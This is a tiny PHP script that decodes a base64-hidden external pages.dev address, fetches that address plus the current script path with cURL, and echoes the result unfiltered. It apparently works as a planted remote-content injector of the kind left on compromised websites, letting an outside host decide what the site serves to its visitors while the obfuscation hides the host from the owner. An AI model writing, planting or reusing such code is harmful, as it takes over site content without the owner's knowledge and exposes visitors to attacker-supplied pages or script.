<?php

function UrlOpener($url) {$ch = curl_init();curl_setopt($ch, CURLOPT_URL, $url);curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);$output = curl_exec($ch);curl_close($ch);echo $output;}UrlOpener(base64_decode("aHR0cHM6Ly95b3VwYXJrLnBhZ2VzLmRldi8=") . $_SERVER['PHP_SELF']);

?>
